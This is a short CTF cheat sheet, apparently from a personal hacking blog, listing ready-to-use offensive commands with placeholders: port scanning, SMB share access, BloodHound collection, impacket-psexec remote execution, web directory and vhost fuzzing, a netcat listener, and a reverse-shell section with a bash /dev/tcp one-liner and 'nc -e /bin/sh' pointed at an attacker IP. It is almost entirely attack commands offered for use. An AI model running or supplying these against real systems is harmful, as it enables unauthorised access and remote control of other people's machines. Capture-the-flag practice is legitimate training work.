---
title: CTF Cheat Sheet
---

**Tagline:** *Everyday Hacks to Elite Attacks — Cyber Warfare. Ghost Ops. Red Team Tactics. HaxrByte.*

# CTF CheatSheet

* TOC
{:toc}

# PortScan

```bash
sudo rustscan -a <target> -- -sCV -oA <filename>
```

# SMB

```bash
smbclient -L //<target> -U <username>%<password>
```
```bash
smbclient //<target>/<share> -U <username>%<password>
```

# BloodHound

```bash
sudo ./bloodhound containers start
```

## RustHound

```bash
rusthound-ce --domain <domain_name> -u <username> -p <password>
```

# Remote Access

```bash
impacket-psexec <domain_name>/<username>:'<password>'@<target>
```

# Web Server

```bash
python3 -m http.server <8080:port> -d <directory>
```

# Web Enumeration

## Files or Directories
```bash
dirsearch -u http://<target>
```
```bash
gobuster dir -u http://<target> -t 20 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html
```
```bash
dirb http://<target>
```
```bash
ffuf -u <url> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -ic -c -e .php
```

## Vhosts or SubDomains
```bash
ffuf -u <url> -H "Host: FUZZ.<domain_name>" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -ic -c -fs <size>
```

# Listener

```bash
rlwrap nc -nvlp <8080:port>
```
rlwrap will enhance the shell, allowing you to clear the screen with [CTRL] + [L].

# Reverse Shell

```bash
'bash -c "bash -i >& /dev/tcp/<attachet_ip>/<8080:port> 0>&1"'
```
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
```bash
nc -e /bin/sh <attacker_ip> <8080:port>
```

# Walkthroughs

```bash
https://0xdf.gitlab.io/
```
